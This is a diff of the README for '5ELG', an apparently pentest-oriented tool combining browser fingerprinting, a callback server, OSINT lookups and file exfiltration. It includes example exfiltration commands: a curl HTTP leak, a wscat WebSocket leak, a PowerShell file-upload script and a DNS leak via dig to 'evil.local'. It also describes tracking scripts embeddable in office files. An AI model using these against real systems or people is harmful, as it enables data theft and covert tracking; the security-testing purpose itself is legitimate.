@@ -2,112 +2,174 @@
 
 ![](https://i.imgur.com/MI80tsY.png)
 
-Browser fingerprinting is a technique used to create a unique identifier for a user's browser based on various attributes and configurations. This "browser deal fingerprinted" is a personal project focused on browser tracking. It collects and stores detailed information about browser requests and user environments, providing insights into browser characteristics and behaviors.
+**5ELG** is an usefull cliend-side utilities freamwork with browser fingerprinting, request callback, and OSINT tool designed for cybersecurity professionals and enthusiasts. It captures detailed browser and system information, facilitates client-side exploitation testing, and supports OSINT operations through API integrations.
+
+With a modular architecture, **5ELG** combines **fingerprinting**, **callback servers**, **file exfiltration**, and **OSINT functionalities**, making it a powerful tool for security audits and offensive operations.
 ## Table of Contents
 
 - [Overview](#overview)
 - [Installation](#installation)
 - [Usage](#usage)
-	- [5ELG Web](#bashboard)
-	- [Configuration](#configuration)
-- [5ELG API Documentation](#5ELG-API)
-- [Fingerprinting](#ABOUT-FINGERPRINTING)
-- [Limitations](#Limitations)
-- [Links](#LINKS)
+    - [5ELG Web](#5elg-web-panel)
+    - [Configuration](#configuration)
+- [5ELG API Documentation](#5elg-api)
+- [Fingerprinting](#about-fingerprinting)
+- [Limitations](#limitations)
+- [Links](#links)
+
 ## Overview
 
-5ELG leverages data collection and retrieval. It gathers a comprehensive set of attributes and configurations from the user’s browser environment, creating a unique fingerprint. This fingerprint, along with other metadata, is stored in an SQLite database, where it can be accessed in a web dasboard.
-
-The unique aspect of 5ELG is that both the JavaScript responsible for tracking, called "*merca*" and the data sender to the dashboard, known as the "dealer," are independent modules. This modular design allows for various tracking methods beyond simply embedding a link. These components can be embedded into office files or triggered from other functionalities, enabling "merca" to send data to the dealer, which then forwards it to 5ELG. Alternatively, if connectivity is unavailable, data can be written to a CSV file, which can later be uploaded to the panel for processing.
-
-![](https://i.imgur.com/7qvRoSm.png)
+✔️ **OSINT Automation**: Integrates APIs like Shodan, VirusTotal, WHOIS, and IPINFO to gather actionable intelligence on IPs and devices.  
+✔️ **Callback Server**: Captures requests via HTTP(S), WebSockets, DNS, and ICMP, enabling testing for SSRF, blind RCE, and XXE vulnerabilities.  
+✔️ **Browser Fingerprinting**: Generates unique browser/device fingerprints and collects comprehensive user environment data.  
+✔️ **File Exfiltration**: Allows secure file uploads for testing data leakage scenarios.  
+✔️ **Custom Dealers**: Modular backend components for managing requests and data collection across diverse platforms (web, PowerShell, hardware).  
 ## Installation
 
-1. **Clone the repository**:
+1. **Clone the Repository**
+    
     ```bash
-    git clone https://github.com/yourusername/5elg.git
-    cd 5elg
+    git clone https://github.com/jomoza/5ELG.git
+    cd 5ELG
+    ```
+    
+2. **Install Dependencies**
+    
+    ```bash
+    npm install
+    ```
+    
+3. **Set Up Environment Variables**  
+    Create a `.env` file with your API keys and configuration settings:
+    
+    ```env
+    SHODAN_API_KEY=your_shodan_key
+    VIRUSTOTAL_API_KEY=your_virustotal_key
+    IPINFO_API_KEY=your_ipinfo_key
+    PORT=8080
+    ```
+    
+4. **Start the Server**
+    
+    ```bash
+    npm start
     ```
 
-2. **Install dependencies**:
-    *Make sure you have Go and SQLite installed:*
-    ```bash
-    go get -u gorm.io/gorm
-    go get -u gorm.io/driver/sqlite
-    ```
+---
+## Configuration
 
-3. **Run the server**:
-    ```bash
-    # Default lunch is running on localhost:8888
-    go run main.go 
-    # Paramed lunch
-    go run main.go -host <ip> -port <port> 
-	# -ssl param is optional if https wanted. Certificates must be stored in Sources/ proyect folder. 
-	# Paramed autentication
-	go run main.go -host <ip> -port <port> -user myuser -password mypass
+### `.env` File
 
-	```
+Configure the following variables:
 
-## **Usage**
+```env
+SHODAN_API_KEY=your_shodan_key
+VIRUSTOTAL_API_KEY=your_virustotal_key
+IPINFO_API_KEY=your_ipinfo_key
+PORT=8080
+```
 
-### **5ELG DASHBOARD**
+## **5ELG WEB PANEL**
 
-5ELG provides a web panel that allows you to track requests received by the "dealers" and upload a CSV file for data collection. Through this interface, you can identify active dealers and view detailed specifications of the browser request data. The panel requires authentication, and it is strongly recommended to change the default basic authentication credentials, as mentioned in the configuration section.
+### **Callback Server**
 
-![](https://i.imgur.com/gcek4VL.png)
+The **callback server** in 5ELG provides a powerful mechanism for observing and capturing outbound traffic generated by vulnerable or misconfigured systems. By leveraging protocols like **HTTP** and **DNS**, we can exfiltrate valuable data during penetration testing or simulate real-world exploitation scenarios.
 
-**Usage tip:** *You can run 5ELG locally (localhost) to keep the panel hidden from public access. Additionally, you can configure the backend of a dealer on the same server to interact with it discreetly through a local address, ensuring a more "stealthy" interaction.*
-##### 5ELG provides several endpoints for interacting with the data:
-		
-	- Endpoint: /
-		- Description: This is the root endpoint of the API. It likely serves the main page or an index view.
-	
-	- Endpoint: /dashboard-logs
-		- Description: Displays logs for the dashboard. This endpoint is likely used to provide access to traffic or request logs in a dashboard interface.
-	
-In the **info** section, at the top, you'll find a hash that uniquely identifies each request. This hash serves as an individual identifier for tracking purposes. Below the hash, you'll see all the information gathered by the dealer, both from the client side and server side. Additionally, if the dealer was able to capture screenshots, generate a PDF, or collect other graphical information, this data will also be displayed in this section. This comprehensive view allows for detailed analysis of each request and its associated data.
-	
-	- Endpoint: /info
-		- Description: Provides detailed information about a specific request or data set. This could be used to display or analyze request logs or metadata.
-	
-	- Endpoint: /scope
-		- Description: CSV data upload.
-	
-	- Endpoint: /data-dealers
-		- Description: Information about working dealers.
+![[Pasted image 20250113011008.png]]
 
-	- Endpoint: /data-logs
-		- Description: Retrieves data or metrics related to the scope of the application, possibly including system status or database information.
-	
+The callback server supports multiple protocols, including:
 
-![](https://i.imgur.com/pqJ0g9p.png)
+- **HTTP(S)**: Analyze headers, methods, and request bodies.
+- **WebSockets**: Capture persistent communications.
+- **DNS and ICMP**: Handle stealthy callbacks for advanced testing.
 
-The **Live Traffic Callback Server** in 5ELG is a service designed to monitor and display real-time traffic data in a web-based interface. It acts as a callback endpoint for external services or applications to send real-time notifications, logs, or data updates to the server.
+---
+### **Browser Fingerprinting**
 
-	- Endpoint: /callback-server
-		- Description: Handles the server-side processing of callback events. This is used for managing asynchronous responses or notifications from external services.
+![[Pasted image 20250113010410.png]]
 
-The server captures these asynchronous responses, processes them, and displays live traffic information on the dashboard. This is useful for monitoring active requests, user behavior, or events in real-time. It allows administrators or developers to see a dynamic flow of incoming data, making it especially valuable for debugging, traffic analysis, or monitoring specific metrics as they occur.
+- Captures detailed browser and system attributes:
+    - Plugins, device properties, GPU model, media devices, local ip, permissions...
+- Includes **NoScript Tracking** for users with disabled JavaScript.
+- Combines data to create a unique fingerprint using SHA256 hashing.
 
-![](https://i.imgur.com/uV90IM6.png)
+### **OSINT**
 
-In addition, the callback server can be configured to work with other tools or services, enabling seamless integration for live monitoring of API requests, security events, or general server traffic.
+🕵️ **Automated OSINT for IPs**
 
-The **/merca** web-endpoint captures and encodes server and request data, while the **/dealer** or **/reciver** endpoint processes and stores this information.
+![[Pasted image 20250113010500.png]]
 
-	- Endpoint: /reciver
-		- Description: This endpoint is responsible for receiving data from external sources. It likely processes and stores incoming data or requests.
-	
-	- Endpoint: /dealer
-		- Description: This endpoint can also serve as an entry point for the callback server, handling dealer-related operations such as processing specific actions or receiving asynchronous data from external services. It enables real-time tracking and efficient integration with third-party systems.
-	
-	- Endpoint:/merca
-		- Description: Responsible for handling requests or data related to "merca." This may involve client-side data or another specific functionality within the application.
+- Integrates APIs like **IPINFO**, **WHOIS**, **Shodan**, **VirusTotal**, **CriminalIP**, and more.
+- Collects geolocation, service details, reputation scores, and threat intelligence.
+- Correlates OSINT data with fingerprints for a comprehensive profile.
+#### **DATA EXILTRATION**
+Data exfiltration through various protocols using a callback server, as well as file reception via HTTP(S), are methods for receiving information from a client in multiple forms. This includes both exfiltrated information within the request and files from a device.
+##### **HTTP Data Exfiltration**
 
-In the project's dealers folder, you will find several dealer examples that can be used as artifacts for connectivity testing. Keep in mind that these dealers are pre-configured to internally send data to the dealer component of the 5ELG panel. These examples provide a useful starting point for understanding how the system works and can be adapted for different testing scenarios.
-## **CONFIGURATION**
+HTTP is one of the most common ways to leak information from a target. By embedding sensitive data into **HTTP headers** or **URL parameters**, an attacker can extract valuable information when the target makes outbound requests to the callback server. Here's an example:
+#### **Exfiltrating Data via HTTP**
+```bash
+curl -I "http://5elg.host/dealer/anyname.png?data=leak-url" \
+  -H "user-agent: leak-ua" \
+  -H "referer: data-leak-ref" \
+  -H "Origin: data-leak-org"
+```
 
-### **MANUAL DEALER CONFIGURATION**
+**USING WEBSOCKETS (EXEMPLE W/ WSCAT)**
+WebSockets are enabled for both user fingerprinting and callback, allowing for data exfiltration. In the near future, they will also support file exfiltration.
+
+```bash
+wscat -c ws://10.13.37.40/leak-path -o "LEAK-HEADER" -H "User-Agent: leak-ws-ua"
+Connected (press CTRL+C to quit)
+< DEALED!
+>
+```
+##### **FILE EXFILTRATION USING HTTP SERVICE**
+The HTTP service allows for the upload of one or multiple files to the 5ELG system using an ID parameter that acts as an identifier for the machine. This functionality can be utilized for various purposes, such as data collection, remote diagnostics, or system monitoring. 
+
+Here an example of how to use PowerShell to send files to the 5ELG system:
+
+```powershell
+$FilePath = "<PATH_TO_FILE>" #HERE THE FILEPATH
+$ID = "<FILE-FINGERPRINT-ID>" #HERE THE ID (FOLDER NAME)
+$Url = "http://<5ELG-HOST>/api/upload"
+$Form = @{
+    file = Get-Item -Path $FilePath
+    ID = $ID
+}
+$boundary = [System.Guid]::NewGuid().ToString()
+$bodyLines = @()
+foreach ($key in $Form.Keys) {
+    $bodyLines += "--$boundary"
+    if ($Form[$key] -is [System.IO.FileInfo]) {
+        $file = $Form[$key]
+        $bodyLines += "Content-Disposition: form-data; name=`"$key`"; filename=`"$($file.Name)`""
+        $bodyLines += "Content-Type: application/octet-stream"
+        $bodyLines += ""
+        $bodyLines += [System.IO.File]::ReadAllBytes($file.FullName)
+    } else {
+        $bodyLines += "Content-Disposition: form-data; name=`"$key`""
+        $bodyLines += ""
+        $bodyLines += $Form[$key]
+    }
+}
+$bodyLines += "--$boundary--"
+$body = [System.Text.Encoding]::UTF8.GetBytes($bodyLines -join "`r`n")
+$authHeader = "Basic " + [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes("5elg_username:5elg_password")) #CHANGE AUTH!
+Invoke-WebRequest -Uri $Url -Method Post -Body $body -ContentType "multipart/form-data; boundary=$boundary" -Headers @{ Authorization = $authHeader }
+```
+
+![[Pasted image 20250123144339.png]]
+#### **DNS Data Exfiltration**
+
+DNS is a stealthier method for leaking data, as DNS queries are often allowed even in restricted environments. By encoding sensitive information into DNS queries, an attacker can exfiltrate data without relying on HTTP or other high-level protocols.
+#### **Example: Exfiltrating Data via DNS**
+```bash
+dig @5elg.host LEAKDATA.evil.local TXT
+```
+
+![[Pasted image 20250123144039.png]]
+## **DEALERS**
 
 _Many of these dealers are still in the development phase and may not function perfectly. We are more than happy to receive your issues or ideas for new dealers, as well as suggestions for improvements or changes to existing ones. Your feedback is invaluable in helping us refine and expand the project to better meet the needs of the community._
 
@@ -170,57 +232,15 @@ ___
 
 This server provides several API endpoints for handling logs and retrieving data related to your application, allowing you to manage logs, generate backups, and query specific data in various formats. Each endpoint serves a specific purpose, whether for retrieving, deleting, or counting log entries, and it requires Basic Authentication for secure access. The server ensures that only authorized users can access or modify the data. With these API endpoints, you can easily manage and retrieve data from your application logs in various formats like CSV and JSON, facilitating data analysis and log tracking.
 
-1. **`/api/generate_csv_logs`**:
-   - **Method**: `POST`
-   - **Description**: Generates a backup of the logs in CSV format and stores the backup file locally on the server.
-
-2. **`/api/clear_logs`**:
-   - **Method**: `POST`
-   - **Description**: Clears all log entries from the database. Useful for resetting or cleaning the database state.
-
-3. **`/api/count_dealers`**:
-   - **Method**: `GET`
-   - **Description**: Returns the number of requests processed by each registered dealer. Provides statistics on the number of interactions with each dealer.
-
-4. **`/api/csv_client_info`**:
-   - **Method**: `GET`
-   - **Parameters**: `id=<client_id>`
-   - **Description**: Downloads a CSV file containing the information for a specific client, based on the provided `client_id`.
-
-5. **`/api/csv_all_clients`**:
-   - **Method**: `GET`
-   - **Description**: Downloads a CSV file containing information for all registered clients.
-
-6. **`/api/get_clientF_info`**:
-   - **Method**: `GET`
-   - **Parameters**: `fu=<fingerprint_user>`
-   - **Description**: Returns JSON data related to a specific user fingerprint (`Fu`), which is a unique identifier generated by the system.
-
-7. **`/api/last7logs`**:
-   - **Method**: `GET`
-   - **Description**: Provides a summary of the last 7 days of logs stored in the system. Displays recent activity.
-
-8. **`/api/logs/total`**:
-   - **Method**: `GET`
-   - **Description**: Returns the total number of logs stored in the database, providing an overview of the number of entries.
-
-9. **`/api/logs/dealers`**:
-   - **Method**: `GET`
-   - **Description**: Returns logs grouped by each dealer, providing a detailed analysis of each dealer's activity.
-
-10. **`/api/logs/ip`**:
-    - **Method**: `GET`
-    - **Description**: Returns logs grouped by IP address, providing information on how many requests have been received from each IP.
-
-11. **`/api/logs/fpus`**:
-    - **Method**: `GET`
-    - **Description**: Returns logs grouped by browser fingerprints (`Fb`) generated by the system based on the client's browser footprint.
-
-12. **`/api/logs/fus`**:
-    - **Method**: `GET`
-    - **Description**: Returns logs grouped by user fingerprints (`Fu`), providing a detailed analysis of unique users.
+You cas see the API DOC [here]().
 
 ## ABOUT FINGERPRINTING 
+
+5ELG leverages data collection and retrieval. It gathers a comprehensive set of attributes and configurations from the user’s browser environment, creating a unique fingerprint. This fingerprint, along with other metadata, is stored in an SQLite database, where it can be accessed in a web dasboard.
+
+The unique aspect of 5ELG is that both the JavaScript responsible for tracking, called "*merca*" and the data sender to the dashboard, known as the "dealer," are independent modules. This modular design allows for various tracking methods beyond simply embedding a link. These components can be embedded into office files or triggered from other functionalities, enabling "merca" to send data to the dealer, which then forwards it to 5ELG. Alternatively, if connectivity is unavailable, data can be written to a CSV file, which can later be uploaded to the panel for processing.
+
+![](https://i.imgur.com/7qvRoSm.png)
 
 The "delaer" collect extensive browser, system, and user information to generate a unique browser fingerprint. It also sends this information back to the server for further analysis. 
 
@@ -295,4 +315,4 @@ Web Application Firewalls (WAFs) are increasingly used to block unwanted traffic
    
 ---
 
-![](https://i.imgflip.com/9ggze6.jpg)
+![[Pasted image 20250113012143.png]]
